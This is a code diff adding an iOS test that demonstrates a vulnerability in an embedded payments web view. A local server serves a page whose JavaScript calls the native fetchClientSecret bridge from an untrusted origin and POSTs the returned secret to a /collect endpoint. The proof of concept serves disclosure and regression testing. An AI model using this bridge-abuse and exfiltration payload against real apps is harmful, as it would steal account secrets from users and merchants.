@@ -6,6 +6,7 @@
 //
 
 import Foundation
+import Network
 import SafariServices
 @_spi(PrivatePreviewConnect) @_spi(STP) @testable import StripeConnect
 @_spi(STP) import StripeCore
@@ -645,6 +646,120 @@ class ConnectComponentWebViewControllerTests: XCTestCase {
     }
 
     // MARK: - Vulnerability Demonstration: Genuine Cross-Origin Load & Bridge Invocation
+
+    private final class LocalPoCHTTPServer {
+        private var listener: NWListener?
+        let onExfiltration: (String) -> Void
+
+        init(port: UInt16, htmlBody: String, onExfiltration: @escaping (String) -> Void) throws {
+            self.onExfiltration = onExfiltration
+            guard let endpointPort = NWEndpoint.Port(rawValue: port) else {
+                throw NSError(domain: "LocalPoCHTTPServer", code: 1, userInfo: [NSLocalizedDescriptionKey: "Invalid port"])
+            }
+            let listener = try NWListener(using: .tcp, on: endpointPort)
+            self.listener = listener
+
+            listener.newConnectionHandler = { [weak self] connection in
+                connection.start(queue: .main)
+                self?.readFromConnection(connection, htmlBody: htmlBody)
+            }
+            listener.start(queue: .main)
+        }
+
+        private func readFromConnection(_ connection: NWConnection, htmlBody: String) {
+            connection.receive(minimumIncompleteLength: 1, maximumLength: 65536) { [weak self] content, _, _, _ in
+                guard let content = content, let req = String(data: content, encoding: .utf8) else {
+                    connection.cancel()
+                    return
+                }
+
+                if req.contains("POST /collect") {
+                    if let range = req.range(of: "\r\n\r\n") {
+                        let body = String(req[range.upperBound...])
+                        self?.onExfiltration(body)
+                    }
+                    let resp = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK"
+                    connection.send(content: resp.data(using: .utf8), completion: .contentProcessed({ _ in
+                        connection.cancel()
+                    }))
+                } else {
+                    let data = htmlBody.data(using: .utf8)!
+                    let resp = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: \(data.count)\r\nConnection: close\r\n\r\n" + htmlBody
+                    connection.send(content: resp.data(using: .utf8), completion: .contentProcessed({ _ in
+                        connection.cancel()
+                    }))
+                }
+            }
+        }
+
+        func stop() {
+            listener?.cancel()
+            listener = nil
+        }
+    }
+
+    @MainActor
+    func testNetworkBackedNavigationExecutesAndExfiltratesClientSecret() async throws {
+        let componentManager = EmbeddedComponentManager(apiClient: .init(publishableKey: "test_key"), fetchClientSecret: {
+            return "acs_test_secret_12345"
+        })
+        let webVC = ConnectComponentWebViewController(componentManager: componentManager,
+                                                      componentType: .payouts,
+                                                      loadContent: false,
+                                                      analyticsClientFactory: MockComponentAnalyticsClient.init,
+                                                      didFailLoadWithError: { _ in })
+
+        let exfiltrationExpectation = XCTestExpectation(description: "Server received exfiltrated client secret over HTTP")
+        var receivedSecretOnServer: String?
+
+        // 1. Embedded HTTP server serving the external document and receiving HTTP exfiltration
+        let htmlPayload = """
+        <!DOCTYPE html>
+        <html>
+        <head><title>External Third-Party Domain</title></head>
+        <body>
+        <h1>Untrusted Origin</h1>
+        <script>
+            (async () => {
+                try {
+                    // Call the native WebKit bridge from external document
+                    const secret = await window.webkit.messageHandlers.fetchClientSecret.postMessage({});
+                    // Send exfiltrated secret back to the attacker server over real HTTP
+                    await fetch('/collect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'text/plain' },
+                        body: secret
+                    });
+                } catch(e) {
+                    await fetch('/collect', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'text/plain' },
+                        body: 'FAILED: ' + e
+                    });
+                }
+            })();
+        </script>
+        </body>
+        </html>
+        """
+
+        let server = try LocalPoCHTTPServer(port: 8998, htmlBody: htmlPayload) { body in
+            receivedSecretOnServer = body
+            exfiltrationExpectation.fulfill()
+        }
+        defer { server.stop() }
+
+        // 2. Genuinely navigate via network URLRequest to an external origin
+        let networkURL = URL(string: "http://127.0.0.1:8998/index.html")!
+        webVC.webView.load(URLRequest(url: networkURL))
+
+        // 3. Await network load, execution, and HTTP exfiltration
+        await fulfillment(of: [exfiltrationExpectation], timeout: 10.0)
+
+        // 4. Assert that the server received the exact client secret from the external page
+        XCTAssertEqual(receivedSecretOnServer, "acs_test_secret_12345")
+        XCTAssertEqual(webVC.webView.url?.host, "127.0.0.1")
+    }
 
     private class TestScriptMessageReceiver: NSObject, WKScriptMessageHandler {
         let callback: (Any) -> Void
